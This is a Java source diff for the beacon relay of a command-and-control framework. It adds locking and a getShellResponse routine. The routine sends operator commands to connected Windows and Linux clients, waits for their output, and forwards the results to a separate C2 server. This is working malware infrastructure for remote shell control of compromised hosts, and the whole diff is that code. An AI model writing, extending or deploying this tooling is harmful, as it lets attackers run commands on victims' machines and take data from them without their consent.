@@ -2,6 +2,7 @@ package Servers.Beacon;
 
 import java.util.Scanner;
 import Servers.Duplexer;
+import Servers.notifyLock;
 
 import java.io.Console;
 import java.io.IOException;
@@ -20,6 +21,10 @@ public class BeaconServer implements Runnable{
     // Dictionary to Map IP's to Objects that handle them
     private HashMap<String,BeaconClientHandler> windowsClientObjects;
     private HashMap<String,BeaconClientHandler> linuxClientObjects;
+
+    // Dictionary to Map IP's to shellLocks (Locks that are used for notifying/waiting when the user wants responses instantly)
+    private HashMap<String,Object> windowsShellLocks;
+    private HashMap<String,Object> linuxShellLocks;
     
     // Pointer to the Thread responsible for interacting with the C2 Server
     private BeaconC2Handler C2Handler;
@@ -29,6 +34,13 @@ public class BeaconServer implements Runnable{
 
     // Boolean to determine if server should remain running
     private boolean sentinel = true;
+
+    // Objects used to determine whether or not the server is still deploying
+    private boolean settingUp;
+    private Object settingUpLock;
+
+    // ID used to make sure that .notify() is not called when it shouldn't
+    private int shellID;
 
     // Text colors for Hard visuals
     private String GREEN = "\u001B[32m";
@@ -44,13 +56,22 @@ public class BeaconServer implements Runnable{
      * @throws IOException
      */
     public BeaconServer(String C2ServerIPAddress, String passwordDigest) throws IOException{
+        this.settingUp = true;
+        this.settingUpLock = new Object();
+
         this.windowsClientResponses = new HashMap<>();
         this.linuxClientResponses = new HashMap<>();
         this.windowsClientObjects = new HashMap<>();
         this.linuxClientObjects = new HashMap<>();
-
+        this.windowsShellLocks = new HashMap<>();
+        this.linuxShellLocks = new HashMap<>();
         this.C2Handler = new BeaconC2Handler(this, C2ServerIPAddress, passwordDigest);
         this.serverSocket = new ServerSocket(80);
+        this.settingUp = false;
+        synchronized(settingUpLock){
+            settingUpLock.notify();
+        }
+        this.shellID = 0;
     }
 
     /**
@@ -62,6 +83,16 @@ public class BeaconServer implements Runnable{
      * @throws IOException
      */
     protected void quit(String reason) throws IOException{
+        // if quit gets called before the constructor is done setting up the server, then wait untill the server is done setting up
+        if(settingUp){
+            synchronized(settingUpLock){
+                try {
+                    settingUpLock.wait();
+                } catch (InterruptedException e){
+                    e.printStackTrace();
+                }
+            }
+        }
         synchronized(windowsClientObjects){
             for(BeaconClientHandler clientHandler : windowsClientObjects.values()){
                 clientHandler.quit(reason);
@@ -286,6 +317,53 @@ public class BeaconServer implements Runnable{
         return table;
     }
 
+    public int getShellID(){
+        return shellID;
+    }
+
+    /**
+     * getShellResponse is used to send a command to a client, and immediately after return the responses from this
+     * client to the C2 Server
+     * @param clientIP
+     * @param command
+     */
+    protected void getShellResponse(String clientIP, String command){
+        // Create variables that will be used
+        BeaconClientHandler clientHandlerObject = null;
+        Object clientShellLock = null;
+
+        // Assign variables correctly based on if the client is windows or linux
+        if(windowsClientObjects.containsKey(clientIP)){
+            clientHandlerObject = windowsClientObjects.get(clientIP);
+            clientShellLock = windowsShellLocks.get(clientIP);
+        } else if (linuxClientObjects.containsKey(clientIP)){
+            clientHandlerObject = linuxClientObjects.get(clientIP);
+            clientShellLock = linuxShellLocks.get(clientIP);
+        }
+
+        // Create a new thread that will notify the lock after 10 seconds, just in case we don't receive anything back from the client
+        shellID++;
+        notifyLock backupNotifyLock = new notifyLock(shellID, this, shellID);
+        Thread backupNotifyLockThread = new Thread(backupNotifyLock);
+        backupNotifyLockThread.start();
+
+        // Set variable so that the client knows to notify once it's done
+        clientHandlerObject.setIsShell(true);
+        clientHandlerObject.sendToClient(command);
+        try{
+            synchronized(clientShellLock){
+                clientShellLock.wait();
+            }
+        } catch (InterruptedException e){
+            e.printStackTrace();
+        }
+
+        // Once we have either been notified or the 10 seconds have bassed, we can send the responses back to the C2 server
+        C2Handler.sendResponsesToC2Server(clientIP);
+
+        clientHandlerObject.setIsShell(false);
+    }
+
     /**
      * This Function is used by the client handler to inform the C2 Server that it has lost a client
      * @param data
@@ -329,9 +407,12 @@ public class BeaconServer implements Runnable{
                     if(OSMessage.equals("Windows") || OSMessage.equals("Linux")){
                         // Send message to C2 announcing that a new client has been obtained
                         C2Handler.sendDataToC2Server("New " + OSMessage + " Client at " + IPAddress);
-    
+                        
+                        // Create object used for notifying/waiting when user wants responses back immeediately
+                        Object shellLockObject = new Object();
+
                         // Create new Beacon Client Handler Thread to handle this connection between the Beacon and the client
-                        BeaconClientHandler clientHandler = new BeaconClientHandler(IPAddress, duplexer, this, OSMessage);
+                        BeaconClientHandler clientHandler = new BeaconClientHandler(IPAddress, duplexer, this, OSMessage, shellLockObject);
                         Thread clientHandlerThread = new Thread(clientHandler);
                         clientHandlerThread.start();
     
@@ -339,9 +420,11 @@ public class BeaconServer implements Runnable{
                         if(OSMessage.equals("Windows")){
                             windowsClientObjects.put(IPAddress,clientHandler);
                             windowsClientResponses.put(IPAddress, new ArrayList<String>());
+                            windowsShellLocks.put(IPAddress, shellLockObject);
                         }else if(OSMessage.equals("Linux")){
                             linuxClientObjects.put(IPAddress,clientHandler);
                             linuxClientResponses.put(IPAddress, new ArrayList<String>());
+                            linuxShellLocks.put(IPAddress, shellLockObject);
                         }
                     }
                 }
